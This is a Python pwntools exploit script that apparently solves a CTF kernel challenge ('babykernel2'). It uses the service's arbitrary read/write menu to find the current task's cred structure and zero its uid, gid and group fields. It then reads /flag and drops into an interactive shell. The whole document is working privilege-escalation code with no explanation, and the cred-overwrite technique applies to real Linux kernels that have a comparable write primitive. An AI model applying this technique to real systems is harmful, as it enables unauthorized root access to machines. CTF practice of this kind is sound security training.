from pwn import *

#elf = ELF("./vmlinux")

def read(addr):
    r.sendlineafter("> ",str(1))
    r.sendlineafter("> ",str(addr))
    a = r.recvuntil("Bye!")
    a= "0x"+a[a.find("is: ")+4:a.find("is: ")+20]
    return a

def write(addr,val):
    r.sendlineafter("> ",str(2))
    r.sendlineafter("> ",str(addr))
    r.sendlineafter("> ",str(val))

def show_uid():
    r.sendlineafter("> ",str(3))
    print(r.recv())

#info("commit creds %s"%hex(elf.sym["current_task"]))
#current_task = elf.sym['current_task']
current_task=0xffffffff8183a040
r = remote("babykernel2.forfuture.fluxfingers.net", 1337)
cred_offset = 0x400
group_offset = 0x60

#Exploit
init_task = read(hex(current_task))
info("init_task struct addr %s"%init_task)
#read cred* struct
cred = int(init_task,16)+cred_offset
cred_struct = read(hex(cred))
cred = int(cred_struct,16)

info("cred struct addr %s"%hex(cred))

uid = cred+0x4
gid = cred+0x8
info("gid addr %s"%hex(gid))
info("uid addr %s"%hex(uid))

#overwrite all ids to 0
for i in range(1,9):
    off = i*0x4
    tmp = cred+off
    write(hex(tmp),str(0))


#write(hex(uid),0)
#write(hex(gid),0)
show_uid()
#overwrite group 
group = cred + group_offset
group_struct = read(hex(group))

info("group_info struct %s"%group_struct)
group_id = int(group_struct,16)+0x8
info("group_id %s"%hex(group_id))
write(hex(group_id),0)

show_uid()
r.sendlineafter("> ",str(4))
r.sendlineafter("> ","/flag")
print(r.recv())
r.interactive()
